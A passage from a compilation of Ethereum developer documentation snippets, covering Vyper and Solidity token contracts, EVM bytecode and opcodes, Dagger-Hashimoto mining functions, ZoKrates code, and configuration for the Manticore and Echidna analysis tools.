\"Encode an integer x as a string of 64 characters using a big-endian scheme\"\n    o = ''\n    for _ in range(NUM_BITS / 8):\n        o = chr(x % 256) + o\n        x //= 256\n    return o\n\ndef decode_int(s):\n    \"Unencode an integer x from a string using a big-endian scheme\"\n    x = 0\n    for c in s:\n        x *= 256\n        x += ord(c)\n    return x\n```\n\n----------------------------------------\n\nTITLE: Creating a Spreadsheet Function for Calculating Hexadecimal Offsets in EVM Bytecode\nDESCRIPTION: This Google Sheets formula calculates the hexadecimal offset for each opcode by adding the size of the previous opcode to its offset, converting between decimal and hexadecimal as needed.\n\nLANGUAGE: googlesheets\nCODE:\n```\n=dec2hex(hex2dec(A1)+B1)\n```\n\n----------------------------------------\n\nTITLE: ERC-721 Token Approval View Functions in Vyper\nDESCRIPTION: View functions that check token approval status, including getApproved for single token approvals and isApprovedForAll for operator approvals.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef getApproved(_tokenId: uint256) -> address:\n    \"\"\"\n    @dev Get the approved address for a single NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId ID of the NFT to query the approval of.\n    \"\"\"\n    # Throws if `_tokenId` is not a valid NFT\n    assert self.idToOwner[_tokenId] != ZERO_ADDRESS\n    return self.idToApprovals[_tokenId]\n\n@view\n@external\ndef isApprovedForAll(_owner: address, _operator: address) -> bool:\n    \"\"\"\n    @dev Checks if `_operator` is an approved operator for `_owner`.\n    @param _owner The address that owns the NFTs.\n    @param _operator The address that acts on behalf of the owner.\n    \"\"\"\n    return (self.ownerToOperators[_owner])[_operator]\n```\n\n----------------------------------------\n\nTITLE: Checking Share Balance in ERC-4626 Vault\nDESCRIPTION: The balanceOf function returns the total amount of vault shares owned by a specific address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction balanceOf(address owner) public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Compiling Zokrates Programs\nDESCRIPTION: Compiles the Zokrates programs using the compile function from the Zokrates library.\n\nLANGUAGE: typescript\nCODE:\n```\nconst digCompiled = zokrates.compile(digProgram)\nconst hashCompiled = zokrates.compile(hashProgram)\n```\n\n----------------------------------------\n\nTITLE: Testing Authorized Access with Cast\nDESCRIPTION: Uses the cast tool to set the verifier address as the authorized server account, which should succeed.\n\nLANGUAGE: shell\nCODE:\n```\ncast send $WORLD_ADDRESS 'app__setVerifier(address)' `cast address-zero` --private-key $AUTHORIZED_KEY\n```\n\n----------------------------------------\n\nTITLE: Internal Function for Adding a Token to an Address\nDESCRIPTION: An internal helper function that handles the process of adding a token to an address. This includes updating ownership records and token counts, with validation to prevent duplicate tokens.\n\nLANGUAGE: vyper\nCODE:\n```\n@internal\ndef _addTokenTo(_to: address, _tokenId: uint256):\n    \"\"\"\n    @dev Add a NFT to a given address\n         Throws if `_tokenId` is owned by someone.\n    \"\"\"\n    # Throws if `_tokenId` is owned by someone\n    assert self.idToOwner[_tokenId] == ZERO_ADDRESS\n    # Change the owner\n    self.idToOwner[_tokenId] = _to\n    # Change count tracking\n    self.ownerToNFTokenCount[_to] += 1\n```\n\n----------------------------------------\n\nTITLE: Example Solidity Contract for Analysis\nDESCRIPTION: A simple Solidity contract used in the examples that contains a function which reverts under specific conditions.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.4.24 <0.6.0;\ncontract Simple {\n    function f(uint a) payable public{\n        if (a == 65) {\n            revert();\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Bytecode and Opcodes\nDESCRIPTION: A compiled ERC20 token contract with bytecode and corresponding opcodes. This contract implements a token named 'Basic' with symbol 'BSC' and includes standard ERC20 functionality like transfers, approvals, and balance management. The contract includes safety checks for overflow and proper address validation.\n\nLANGUAGE: bytecode\nCODE:\n```\n083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\nLANGUAGE: opcodes\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1539 CODESIZE SUB DUP1 PUSH3 0x1539 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4261736963000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4253430000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xCC SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP DUP1 PUSH1 0x4 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xE5 SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP PUSH1 0x12 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH3 0x116 CALLER DUP3 PUSH3 0x11D PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH3 0x438 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH3 0x1C1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1F DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x45524332303A206D696E7420746F20746865207A65726F206164647265737300 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x1D5 PUSH1 0x0 DUP4 DUP4 PUSH3 0x2FB PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x1F1 DUP2 PUSH1 0x2 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH3 0x24F DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH3 0x300 PUSH1 0x20 SHL PUSH3 0xF2D OR SWAP1 SWAP2 SWAP1 PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH3 0x37F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x3CC JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x3FD JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x3FD JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x3FC JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x3DF JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x40C SWAP2 SWAP1 PUSH3 0x410 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x435 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x431 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x417 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x10F1 DUP1 PUSH3 0x448 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x25F JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x2C5 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x31D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x3A0 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x406 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x46C JUMPI PUSH2 0xA9 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x197 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1B5 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x23B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x4E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xF6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xDB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x123 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x586 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x221 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x243 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x69E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x2DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x751 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x325 PUSH2 0x799 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x365 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x392 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x3EC PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x3B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD\n```\n\n----------------------------------------\n\nTITLE: Implementing Internal Links in Ethereum Documentation\nDESCRIPTION: Guidelines for creating internal links within Ethereum.org content using relative paths instead of absolute paths to maintain functionality across different language versions of the site.\n\nLANGUAGE: markdown\nCODE:\n```\n<!-- Good -->\n\nRead more about [smart contracts](/docs/developers/smart-contracts/)\n\n<!-- Bad -->\n\nRead more about [smart contracts](/en/docs/developers/smart-contracts)\nRead more about [smart contracts](https://ethereum.org/en/docs/developers/smart-contracts)\n```\n\n----------------------------------------\n\nTITLE: Executing Named Transactions in Manticore\nDESCRIPTION: Example of how to call a specific contract function by name with symbolic arguments, allowing targeted exploration of a particular function.\n\nLANGUAGE: python\nCODE:\n```\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var, caller=user_account, value=0)\n```\n\n----------------------------------------\n\nTITLE: Executing a Trade in ERC-721 Marketplace in Solidity\nDESCRIPTION: Function to execute a trade by accepting an open listing. The buyer transfers the specified price to the seller, the item is transferred from the contract to the buyer, and the trade status is updated.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction executeTrade(uint256 _trade)\n  public\n{\n  Trade memory trade = trades[_trade];\n  require(trade.status == \"Open\", \"Trade is not Open.\");\n  currencyToken.transferFrom(msg.sender, trade.poster, trade.price);\n  itemToken.transferFrom(address(this), msg.sender, trade.item);\n  trades[_trade].status = \"Executed\";\n  emit TradeStatusChange(_trade, \"Executed\");\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Initialization Function\nDESCRIPTION: Defines an initialization function that sets up the contract with references to the L1 messenger and L2 token bridge. This function can only be called once and is used instead of constructor parameters due to the proxy pattern.\n\nLANGUAGE: solidity\nCODE:\n```\n    /******************\n     * Initialization *\n     ******************/\n\n    /**\n     * @param _l1messenger L1 Messenger address being used for cross-chain communications.\n     * @param _l2TokenBridge L2 standard bridge address.\n     */\n    // slither-disable-next-line external-function\n    function initialize(address _l1messenger, address _l2TokenBridge) public {\n        require(messenger == address(0), \"Contract has already been initialized.\");\n        messenger = _l1messenger;\n        l2TokenBridge = _l2TokenBridge;\n    }\n```\n\n----------------------------------------\n\nTITLE: Overflow Check in EVM Before Value Update\nDESCRIPTION: Performs an overflow check to ensure adding the call value to the current storage value won't cause an arithmetic overflow. Uses bitwise NOT and comparison operations to detect potential overflow conditions.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n1A7 | JUMPDEST   | Value* CALLVALUE 0x75 0 6 CALLVALUE                        \n1A8 | PUSH1 0x00 | 0x00 Value* CALLVALUE 0x75 0 6 CALLVALUE                   \n1AA | DUP3       | CALLVALUE 0x00 Value* CALLVALUE 0x75 0 6 CALLVALUE         \n1AB | NOT        | 2^256-CALLVALUE-1 0x00 Value* CALLVALUE 0x75 0 6 CALLVALUE\n```\n\n----------------------------------------\n\nTITLE: Definiendo el ABI simplificado para interactuar con tokens ERC20\nDESCRIPTION: Definición del ABI (Application Binary Interface) simplificado para un token ERC20, que incluye solo las funciones transfer y balanceOf, y establece la dirección del contrato DAI en la red principal.\n\nLANGUAGE: javascript\nCODE:\n```\nconst ERC20TransferABI = [\n  {\n    constant: false,\n    inputs: [\n      {\n        name: \"_to\",\n        type: \"address\",\n      },\n      {\n        name: \"_value\",\n        type: \"uint256\",\n      },\n    ],\n    name: \"transfer\",\n    outputs: [\n      {\n        name: \"\",\n        type: \"bool\",\n      },\n    ],\n    payable: false,\n    stateMutability: \"nonpayable\",\n    type: \"function\",\n  },\n  {\n    constant: true,\n    inputs: [\n      {\n        name: \"_owner\",\n        type: \"address\",\n      },\n    ],\n    name: \"balanceOf\",\n    outputs: [\n      {\n        name: \"balance\",\n        type: \"uint256\",\n      },\n    ],\n    payable: false,\n    stateMutability: \"view\",\n    type: \"function\",\n  },\n]\n\nconst DAI_ADDRESS = \"0x6b175474e89094c44da98b954eedeac495271d0f\"\n```\n\n----------------------------------------\n\nTITLE: Defining Solidity Version for L1 Standard Bridge Contract\nDESCRIPTION: Specifies the Solidity compiler version requirement for the L1 Standard Bridge contract, using version 0.8.9 or higher with MIT license.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n```\n\n----------------------------------------\n\nTITLE: Rendering Contributors Component in React\nDESCRIPTION: This code displays a Contributors component that likely shows a list of all the people who have contributed to the ethereum.org website.\n\nLANGUAGE: jsx\nCODE:\n```\n<Contributors />\n```\n\n----------------------------------------\n\nTITLE: Preventing Transfers from Frozen Accounts in Solidity\nDESCRIPTION: A require statement used in the _beforeTokenTransfer hook to prevent token transfers from frozen accounts. This allows the contract to block outgoing transfers while still permitting incoming transfers.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(!frozenAccounts[from], \"The account is frozen\");\n```\n\n----------------------------------------\n\nTITLE: Declaring Minter Authorization in ERC-721 Contract\nDESCRIPTION: Defines a state variable to store the address of the authorized minter who can create new tokens. This simple approach centralizes minting authority to a single address.\n\nLANGUAGE: vyper\nCODE:\n```\n# @dev Address of minter, who can mint a token\nminter: address\n```\n\n----------------------------------------\n\nTITLE: Implementing Mining and Verification Functions for Dagger-Hashimoto\nDESCRIPTION: Functions for mining new blocks and verifying existing blocks using the Dagger-Hashimoto algorithm. Includes implementations for both full nodes and light clients with appropriate difficulty checking.\n\nLANGUAGE: python\nCODE:\n```\ndef mine(daggerset, params, block):\n    from random import randint\n    nonce = randint(0, 2**64)\n    while 1:\n        result = hashimoto(daggerset, get_dagsize(params, block),\n                           params, decode_int(block.prevhash), nonce)\n        if result * params[\"diff\"] < 2**256:\n            break\n        nonce += 1\n        if nonce >= 2**64:\n            nonce = 0\n    return nonce\n\ndef verify(daggerset, params, block, nonce):\n    result = hashimoto(daggerset, get_dagsize(params, block),\n                       params, decode_int(block.prevhash), nonce)\n    return result * params[\"diff\"] < 2**256\n\ndef light_verify(params, header, nonce):\n    seedset = get_seedset(params, block)\n    result = quick_hashimoto(seedset[\"front_hash\"], get_dagsize(params, block),\n                             params, decode_int(block.prevhash), nonce)\n    return result * params[\"diff\"] < 2**256\n```\n\n----------------------------------------\n\nTITLE: Defining a Map Hashing Function in ZoKrates\nDESCRIPTION: Implements the hashMap function that calculates a hash for a 2D boolean array representing a game map. It flattens the 2D map into a 1D array, packs it into field elements, and then uses the Poseidon hash function.\n\nLANGUAGE: zokrates\nCODE:\n```\n        def hashMap(bool[${width+2}][${height+2}] map) -> field {\n   bool[512] mut map1d = [false; 512];\n   u32 mut counter = 0;\n   for u32 x in 0..${width+2} {\n      for u32 y in 0..${height+2} {\n         map1d[counter] = map[x][y];\n         counter = counter+1;\n      }\n   }\n    field[4] hashMe = [\n        pack128(map1d[0..128]),\n        pack128(map1d[128..256]),\n        pack128(map1d[256..384]),\n        pack128(map1d[384..512])\n    ];\n    return poseidon(hashMe);\n}\n```\n\n----------------------------------------\n\nTITLE: Validating and Finalizing Token Minting\nDESCRIPTION: Performs validation checks, creates the token, and emits a Transfer event to signify token creation. The transfer is from the zero address to indicate a new token.\n\nLANGUAGE: python\nCODE:\n```\n    # Throws if `_to` is zero address\n    assert _to != ZERO_ADDRESS\n    # Add NFT. Throws if `_tokenId` is owned by someone\n    self._addTokenTo(_to, _tokenId)\n    log Transfer(ZERO_ADDRESS, _to, _tokenId)\n    return True\n```\n\n----------------------------------------\n\nTITLE: Installing Waffle and Ethers Dependencies\nDESCRIPTION: Commands to add Ethereum Waffle and Ethers.js libraries to the project for smart contract testing.\n\nLANGUAGE: bash\nCODE:\n```\nyarn add --dev ethereum-waffle ethers\n# or if you're using npm\nnpm install ethereum-waffle ethers --save-dev\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration with Sequence Length Control\nDESCRIPTION: This configuration enables gas estimation while limiting the transaction sequence length to 2 for clearer analysis results.\n\nLANGUAGE: yaml\nCODE:\n```\nseqLen: 2\nestimateGas: true\n```\n\n----------------------------------------\n\nTITLE: Listening to Smart Contract Events with Web3.js\nDESCRIPTION: JavaScript code snippet demonstrating how to subscribe to smart contract events using Web3.js. This shows the traditional approach to monitoring blockchain data before using The Graph.\n\nLANGUAGE: javascript\nCODE:\n```\nGameContract.events.BetPlaced({\n    fromBlock: 0\n}, function(error, event) { console.log(event); })\n.on('data', function(event) {\n    // eveniment declanșat\n})\n.on('changed', function(event) {\n    // evenimentul a fost eliminat din nou\n})\n.on('error', function(error, receipt) {\n    // tx respins\n});\n```\n\n----------------------------------------\n\nTITLE: Implémentation du crochet _beforeTokenTransfer en Solidity\nDESCRIPTION: Cette fonction surcharge le crochet _beforeTokenTransfer de la classe ERC20 pour ajouter des vérifications de sécurité avant le transfert de jetons.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _beforeTokenTransfer(address from, address to, uint256 amount)\n    internal virtual\n    override(ERC20)\n{\n    super._beforeTokenTransfer(from, to, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Functions in Echidna Configuration\nDESCRIPTION: YAML configuration for including or excluding specific functions during an Echidna fuzzing campaign. The filterBlacklist parameter determines whether listed functions are blacklisted or whitelisted.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"f1\", \"f2\", \"f3\"]\n```\n\n----------------------------------------\n\nTITLE: Implementing Internal isApprovedOrOwner Helper for ERC-721 in Vyper\nDESCRIPTION: Internal view function that checks whether an address is allowed to transfer a specific token by being the owner, an approved address, or an approved operator.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@internal\ndef _isApprovedOrOwner(_spender: address, _tokenId: uint256) -> bool:\n    \"\"\"\n    @dev Returns whether the given spender can transfer a given token ID\n    @param spender address of the spender to query\n    @param tokenId uint256 ID of the token to be transferred\n    @return bool whether the msg.sender is approved for the given token ID,\n        is an operator of the owner, or is the owner of the token\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    spenderIsOwner: bool = owner == _spender\n    spenderIsApproved: bool = _spender == 